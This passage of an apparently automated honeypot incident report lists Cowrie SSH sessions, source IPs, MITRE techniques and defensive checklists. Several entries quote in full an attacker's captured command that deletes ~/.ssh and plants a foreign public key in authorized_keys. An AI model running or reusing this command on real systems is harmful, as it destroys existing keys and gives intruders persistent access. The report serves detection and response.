- [ ] Submit `40.81.224[.]160` to AbuseIPDB if not already reported
- [ ] Block `40.81.224[.]160` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6d1d3f68985d

| Field | Detail |
|---|---|
| **Source IP** | `73.36.177[.]174` |
| **First Seen** | 2026-05-22 05:30 |
| **Last Seen** | 2026-05-22 05:31 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 05:30:53` | `cowrie.session.connect` |
| `2026-05-22 05:30:53` | `cowrie.client.version` |
| `2026-05-22 05:30:53` | `cowrie.client.kex` |
| `2026-05-22 05:30:54` | `cowrie.login.success` |
| `2026-05-22 05:30:55` | `cowrie.session.params` |
| `2026-05-22 05:30:55` | `cowrie.command.input` |
| `2026-05-22 05:30:55` | `cowrie.command.failed` |
| `2026-05-22 05:30:55` | `cowrie.log.closed` |
| `2026-05-22 05:30:56` | `cowrie.session.params` |
| `2026-05-22 05:30:56` | `cowrie.command.input` |
| `2026-05-22 05:30:56` | `cowrie.session.file_download` |
| `2026-05-22 05:30:56` | `cowrie.log.closed` |
| `2026-05-22 05:31:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `73.36.177[.]174` to AbuseIPDB if not already reported
- [ ] Block `73.36.177[.]174` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-342d3153316d

| Field | Detail |
|---|---|
| **Source IP** | `73.36.177[.]174` |
| **First Seen** | 2026-05-22 05:30 |
| **Last Seen** | 2026-05-22 05:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 05:30:59` | `cowrie.session.connect` |
| `2026-05-22 05:30:59` | `cowrie.client.version` |
| `2026-05-22 05:31:00` | `cowrie.client.kex` |
| `2026-05-22 05:31:01` | `cowrie.login.success` |
| `2026-05-22 05:31:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `73.36.177[.]174` to AbuseIPDB if not already reported
- [ ] Block `73.36.177[.]174` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d795917d435d

| Field | Detail |
|---|---|
| **Source IP** | `40.81.224[.]160` |
| **First Seen** | 2026-05-22 05:32 |
| **Last Seen** | 2026-05-22 05:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 05:32:40` | `cowrie.session.connect` |
| `2026-05-22 05:32:40` | `cowrie.client.version` |
| `2026-05-22 05:32:40` | `cowrie.client.kex` |
| `2026-05-22 05:32:40` | `cowrie.login.success` |
| `2026-05-22 05:32:40` | `cowrie.session.params` |
| `2026-05-22 05:32:40` | `cowrie.command.input` |
| `2026-05-22 05:32:40` | `cowrie.command.failed` |
| `2026-05-22 05:32:40` | `cowrie.log.closed` |
| `2026-05-22 05:32:40` | `cowrie.session.params` |
| `2026-05-22 05:32:40` | `cowrie.command.input` |
| `2026-05-22 05:32:40` | `cowrie.session.file_download` |
| `2026-05-22 05:32:40` | `cowrie.log.closed` |
| `2026-05-22 05:32:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.81.224[.]160` to AbuseIPDB if not already reported
- [ ] Block `40.81.224[.]160` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f32dc063ee5

| Field | Detail |
|---|---|
| **Source IP** | `40.81.224[.]200` |
| **First Seen** | 2026-05-22 05:32 |
| **Last Seen** | 2026-05-22 05:32 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 05:32:41` | `cowrie.session.connect` |
| `2026-05-22 05:32:41` | `cowrie.client.version` |
| `2026-05-22 05:32:41` | `cowrie.client.kex` |
| `2026-05-22 05:32:41` | `cowrie.login.success` |
| `2026-05-22 05:32:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.81.224[.]200` to AbuseIPDB if not already reported
- [ ] Block `40.81.224[.]200` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-16e6abd2ff4c

| Field | Detail |
|---|---|
| **Source IP** | `197.156.83[.]94` |
| **First Seen** | 2026-05-22 05:34 |
| **Last Seen** | 2026-05-22 05:34 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 05:34:27` | `cowrie.session.connect` |
| `2026-05-22 05:34:27` | `cowrie.client.version` |
| `2026-05-22 05:34:28` | `cowrie.client.kex` |
| `2026-05-22 05:34:28` | `cowrie.login.success` |
| `2026-05-22 05:34:29` | `cowrie.session.params` |
| `2026-05-22 05:34:29` | `cowrie.command.input` |
| `2026-05-22 05:34:29` | `cowrie.command.failed` |
| `2026-05-22 05:34:29` | `cowrie.log.closed` |
| `2026-05-22 05:34:29` | `cowrie.session.params` |
| `2026-05-22 05:34:29` | `cowrie.command.input` |
| `2026-05-22 05:34:30` | `cowrie.session.file_download` |
| `2026-05-22 05:34:30` | `cowrie.log.closed` |
| `2026-05-22 05:34:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.156.83[.]94` to AbuseIPDB if not already reported
- [ ] Block `197.156.83[.]94` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fba3edc737a5

| Field | Detail |
|---|---|
| **Source IP** | `197.156.83[.]94` |
| **First Seen** | 2026-05-22 05:34 |
| **Last Seen** | 2026-05-22 05:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 05:34:32` | `cowrie.session.connect` |
| `2026-05-22 05:34:32` | `cowrie.client.version` |
| `2026-05-22 05:34:32` | `cowrie.client.kex` |
| `2026-05-22 05:34:33` | `cowrie.login.success` |
| `2026-05-22 05:34:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.156.83[.]94` to AbuseIPDB if not already reported
- [ ] Block `197.156.83[.]94` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dc601645aad3

| Field | Detail |
|---|---|
| **Source IP** | `40.81.224[.]203` |
| **First Seen** | 2026-05-22 05:36 |
| **Last Seen** | 2026-05-22 05:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 05:36:43` | `cowrie.session.connect` |
| `2026-05-22 05:36:43` | `cowrie.client.version` |
| `2026-05-22 05:36:43` | `cowrie.client.kex` |
| `2026-05-22 05:36:43` | `cowrie.login.success` |
| `2026-05-22 05:36:43` | `cowrie.session.params` |
| `2026-05-22 05:36:43` | `cowrie.command.input` |
| `2026-05-22 05:36:43` | `cowrie.command.failed` |
| `2026-05-22 05:36:43` | `cowrie.log.closed` |
| `2026-05-22 05:36:43` | `cowrie.session.params` |
| `2026-05-22 05:36:43` | `cowrie.command.input` |
| `2026-05-22 05:36:43` | `cowrie.session.file_download` |
| `2026-05-22 05:36:43` | `cowrie.log.closed` |
| `2026-05-22 05:36:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.81.224[.]203` to AbuseIPDB if not already reported
- [ ] Block `40.81.224[.]203` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fd76be55dec5

| Field | Detail |
|---|---|
| **Source IP** | `40.81.224[.]160` |
| **First Seen** | 2026-05-22 05:36 |
| **Last Seen** | 2026-05-22 05:36 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 05:36:44` | `cowrie.session.connect` |
| `2026-05-22 05:36:44` | `cowrie.client.version` |
| `2026-05-22 05:36:44` | `cowrie.client.kex` |
| `2026-05-22 05:36:45` | `cowrie.login.success` |
| `2026-05-22 05:36:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.81.224[.]160` to AbuseIPDB if not already reported
- [ ] Block `40.81.224[.]160` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e64f7651ff62

| Field | Detail |
|---|---|
| **Source IP** | `40.81.224[.]201` |
| **First Seen** | 2026-05-22 05:40 |
| **Last Seen** | 2026-05-22 05:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 05:40:43` | `cowrie.session.connect` |
| `2026-05-22 05:40:43` | `cowrie.client.version` |
| `2026-05-22 05:40:43` | `cowrie.client.kex` |
| `2026-05-22 05:40:43` | `cowrie.login.success` |
| `2026-05-22 05:40:43` | `cowrie.session.params` |
| `2026-05-22 05:40:43` | `cowrie.command.input` |
| `2026-05-22 05:40:43` | `cowrie.command.failed` |
| `2026-05-22 05:40:43` | `cowrie.log.closed` |
| `2026-05-22 05:40:43` | `cowrie.session.params` |
| `2026-05-22 05:40:43` | `cowrie.command.input` |
| `2026-05-22 05:40:43` | `cowrie.session.file_download` |
| `2026-05-22 05:40:43` | `cowrie.log.closed` |
| `2026-05-22 05:40:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.81.224[.]201` to AbuseIPDB if not already reported
- [ ] Block `40.81.224[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6202924a8e28

| Field | Detail |
|---|---|
| **Source IP** | `40.81.224[.]201` |
| **First Seen** | 2026-05-22 05:40 |
| **Last Seen** | 2026-05-22 05:40 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 05:40:44` | `cowrie.session.connect` |
| `2026-05-22 05:40:44` | `cowrie.client.version` |
| `2026-05-22 05:40:44` | `cowrie.client.kex` |
| `2026-05-22 05:40:44` | `cowrie.login.success` |
| `2026-05-22 05:40:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.81.224[.]201` to AbuseIPDB if not already reported
- [ ] Block `40.81.224[.]201` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6f442694e059

| Field | Detail |
|---|---|
| **Source IP** | `40.81.224[.]200` |
| **First Seen** | 2026-05-22 05:44 |
| **Last Seen** | 2026-05-22 05:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 05:44:50` | `cowrie.session.connect` |
| `2026-05-22 05:44:50` | `cowrie.client.version` |
| `2026-05-22 05:44:50` | `cowrie.client.kex` |
| `2026-05-22 05:44:50` | `cowrie.login.success` |
| `2026-05-22 05:44:50` | `cowrie.session.params` |
| `2026-05-22 05:44:50` | `cowrie.command.input` |
| `2026-05-22 05:44:50` | `cowrie.command.failed` |
| `2026-05-22 05:44:50` | `cowrie.log.closed` |
| `2026-05-22 05:44:50` | `cowrie.session.params` |
| `2026-05-22 05:44:50` | `cowrie.command.input` |
| `2026-05-22 05:44:50` | `cowrie.session.file_download` |
| `2026-05-22 05:44:50` | `cowrie.log.closed` |
| `2026-05-22 05:44:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.81.224[.]200` to AbuseIPDB if not already reported
- [ ] Block `40.81.224[.]200` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa15b41cde24

| Field | Detail |
|---|---|
| **Source IP** | `40.81.224[.]201` |
| **First Seen** | 2026-05-22 05:44 |
| **Last Seen** | 2026-05-22 05:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 05:44:51` | `cowrie.session.connect` |
| `2026-05-22 05:44:51` | `cowrie.client.version` |
| `2026-05-22 05:44:51` | `cowrie.client.kex` |
| `2026-05-22 05:44:51` | `cowrie.login.success` |
| `2026-05-22 05:44:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.81.224[.]201` to AbuseIPDB if not already reported
- [ ] Block `40.81.224[.]201` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3247d962a1a0

| Field | Detail |
|---|---|
| **Source IP** | `197.156.83[.]94` |
| **First Seen** | 2026-05-22 05:46 |
| **Last Seen** | 2026-05-22 05:46 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 05:46:19` | `cowrie.session.connect` |
| `2026-05-22 05:46:19` | `cowrie.client.version` |
| `2026-05-22 05:46:19` | `cowrie.client.kex` |
| `2026-05-22 05:46:20` | `cowrie.login.success` |
| `2026-05-22 05:46:20` | `cowrie.session.params` |
| `2026-05-22 05:46:20` | `cowrie.command.input` |
| `2026-05-22 05:46:20` | `cowrie.command.failed` |
| `2026-05-22 05:46:20` | `cowrie.log.closed` |
| `2026-05-22 05:46:21` | `cowrie.session.params` |
| `2026-05-22 05:46:21` | `cowrie.command.input` |
| `2026-05-22 05:46:21` | `cowrie.session.file_download` |
| `2026-05-22 05:46:21` | `cowrie.log.closed` |
| `2026-05-22 05:46:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.156.83[.]94` to AbuseIPDB if not already reported
- [ ] Block `197.156.83[.]94` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-35f860f1c785

| Field | Detail |
|---|---|
| **Source IP** | `197.156.83[.]94` |
| **First Seen** | 2026-05-22 05:46 |
| **Last Seen** | 2026-05-22 05:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 05:46:23` | `cowrie.session.connect` |
| `2026-05-22 05:46:23` | `cowrie.client.version` |
| `2026-05-22 05:46:23` | `cowrie.client.kex` |
| `2026-05-22 05:46:24` | `cowrie.login.success` |
| `2026-05-22 05:46:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.156.83[.]94` to AbuseIPDB if not already reported
- [ ] Block `197.156.83[.]94` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d6d6c7c4090

| Field | Detail |
|---|---|
| **Source IP** | `197.156.83[.]94` |
| **First Seen** | 2026-05-22 05:50 |
| **Last Seen** | 2026-05-22 05:50 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 05:50:14` | `cowrie.session.connect` |
| `2026-05-22 05:50:14` | `cowrie.client.version` |
| `2026-05-22 05:50:14` | `cowrie.client.kex` |
| `2026-05-22 05:50:14` | `cowrie.login.success` |
| `2026-05-22 05:50:15` | `cowrie.session.params` |
| `2026-05-22 05:50:15` | `cowrie.command.input` |
| `2026-05-22 05:50:15` | `cowrie.command.failed` |
| `2026-05-22 05:50:15` | `cowrie.log.closed` |
| `2026-05-22 05:50:16` | `cowrie.session.params` |
| `2026-05-22 05:50:16` | `cowrie.command.input` |
| `2026-05-22 05:50:16` | `cowrie.session.file_download` |
| `2026-05-22 05:50:16` | `cowrie.log.closed` |
| `2026-05-22 05:50:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.156.83[.]94` to AbuseIPDB if not already reported
- [ ] Block `197.156.83[.]94` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de5bb002d01d

| Field | Detail |
|---|---|
| **Source IP** | `197.156.83[.]94` |
| **First Seen** | 2026-05-22 05:50 |
| **Last Seen** | 2026-05-22 05:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 05:50:18` | `cowrie.session.connect` |
| `2026-05-22 05:50:18` | `cowrie.client.version` |
| `2026-05-22 05:50:18` | `cowrie.client.kex` |
| `2026-05-22 05:50:19` | `cowrie.login.success` |
| `2026-05-22 05:50:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.156.83[.]94` to AbuseIPDB if not already reported
- [ ] Block `197.156.83[.]94` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b562edd8e28

| Field | Detail |
|---|---|
| **Source IP** | `73.36.177[.]174` |
| **First Seen** | 2026-05-22 05:54 |
| **Last Seen** | 2026-05-22 05:55 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
